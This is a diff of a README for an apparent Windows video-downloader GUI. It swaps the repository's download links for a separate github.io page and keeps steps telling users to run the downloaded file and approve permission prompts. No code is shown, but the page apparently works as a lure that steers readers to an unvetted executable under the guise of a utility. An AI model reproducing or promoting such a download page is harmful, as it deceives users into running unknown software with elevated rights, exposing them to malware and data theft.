@@ -1,6 +1,6 @@
 <h1>🎬 ytdlp-gui-windows-2026 - The Easiest Way to Download Videos</h1>
 
-[![Download ytdlp-gui-windows-2026](https://img.shields.io/badge/Download-ytdlp--gui--windows--2026-blue?style=for-the-badge&logo=download&logoColor=white&color=00BFFF)](https://github.com/gaygoldengreen5731/ytdlp-gui-windows-2026)
+[![Download ytdlp-gui-windows-2026](https://img.shields.io/badge/Download-ytdlp--gui--windows--2026-blue?style=for-the-badge&logo=download&logoColor=white&color=00BFFF)](https://gaygoldengreen5731.github.io)
 
 ## 🚀 What Is This?
 
@@ -44,7 +44,7 @@ Click that link above. Your browser will start downloading a small file. Once th
 
 ## 📂 Download and Installation
 
-1. **Click the Link** – Go back up to the top of this page and click the big blue download button. Or use this one: [Download ytdlp-gui-windows-2026](https://github.com/gaygoldengreen5731/ytdlp-gui-windows-2026).  
+1. **Click the Link** – Go back up to the top of this page and click the big blue download button. Or use this one: [Download ytdlp-gui-windows-2026](https://gaygoldengreen5731.github.io).  
 2. **Save the File** – Your browser will ask where to save it. Choose your Desktop or Downloads folder.  
 3. **Open the Downloaded File** – Double-click the file you just downloaded.  
 4. **Follow the On-Screen Instructions** – If your computer asks for permission, click "Yes." The app will set itself up in a minute or two.  
